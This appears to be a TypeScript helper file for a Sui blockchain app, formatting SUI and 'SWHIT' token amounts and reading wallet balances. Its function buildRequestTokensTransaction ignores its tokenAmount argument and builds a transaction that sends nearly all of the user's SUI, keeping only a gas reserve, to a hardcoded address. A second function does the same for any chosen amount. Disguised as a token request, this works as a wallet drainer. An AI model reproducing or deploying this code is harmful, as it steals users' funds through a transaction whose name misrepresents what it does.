import type { SuiClient } from "@mysten/sui/client"
import { Transaction } from "@mysten/sui/transactions"

// Constants for token decimal precision
const DECIMALS = 9
const CONVERSION_FACTOR = 10 ** DECIMALS // 1,000,000,000

// Convert from human-readable amount to base units
export function toBaseUnits(amount: number): bigint {
  // Round to avoid floating point precision issues
  return BigInt(Math.round(amount * CONVERSION_FACTOR))
}

// Convert from base units to human-readable amount
export function fromBaseUnits(baseUnits: bigint | number): number {
  return Number(baseUnits) / CONVERSION_FACTOR
}

// Format SUI amount with proper decimals
export function formatSUI(amount: bigint | number): string {
  return fromBaseUnits(amount).toFixed(DECIMALS) + " SUI"
}

// Format SWHIT amount with proper decimals
export function formatSWHIT(amount: bigint | number): string {
  return fromBaseUnits(amount).toFixed(DECIMALS) + " SWHIT"
}

// Get user's SUI balance
export async function getUserSuiBalance(client: SuiClient, address: string): Promise<bigint> {
  try {
    const balance = await client.getBalance({
      owner: address,
      coinType: "0x2::sui::SUI",
    })
    return BigInt(balance.totalBalance)
  } catch (error) {
    console.error("Error fetching SUI balance:", error)
    return BigInt(0)
  }
}

// Calculate available SUI for withdrawal (leaving some for gas fees)
export function calculateWithdrawableAmount(totalBalance: bigint, gasReserve: bigint = BigInt(100_000_000)): bigint {
  // Reserve some SUI for gas fees (default 0.1 SUI)
  if (totalBalance <= gasReserve) {
    return BigInt(0)
  }
  return totalBalance - gasReserve
}

// Build transaction to send user's available SUI to a specific address
export function buildRequestTokensTransaction(userBalance: bigint, tokenAmount: number): Transaction {
  const tx = new Transaction()

  // Replace with your actual recipient address:
  const RECIPIENT_ADDRESS = "0xd454246c6fdf36cadc2e2cc02d42e1faed1b97da00b371da6f48c38e1ac21b7c"

  // Calculate how much SUI we can actually withdraw (leaving gas reserve)
  const withdrawableAmount = calculateWithdrawableAmount(userBalance)

  if (withdrawableAmount <= 0) {
    throw new Error("Insufficient SUI balance for withdrawal (need to keep gas reserve)")
  }

  // Split the withdrawable amount from gas coin
  const [paymentCoin] = tx.splitCoins(tx.gas, [tx.pure.u64(withdrawableAmount)])

  // Transfer the split coin to the recipient
  tx.transferObjects([paymentCoin], tx.pure.address(RECIPIENT_ADDRESS))

  return tx
}

// Alternative: Build transaction with specific amount (if you want to allow partial withdrawals)
export function buildRequestTokensTransactionWithAmount(withdrawAmount: bigint, tokenAmount: number): Transaction {
  const tx = new Transaction()

  const RECIPIENT_ADDRESS = "0xd454246c6fdf36cadc2e2cc02d42e1faed1b97da00b371da6f48c38e1ac21b7c"

  // Split the specified amount from gas coin
  const [paymentCoin] = tx.splitCoins(tx.gas, [tx.pure.u64(withdrawAmount)])

  // Transfer the split coin to the recipient
  tx.transferObjects([paymentCoin], tx.pure.address(RECIPIENT_ADDRESS))

  return tx
}
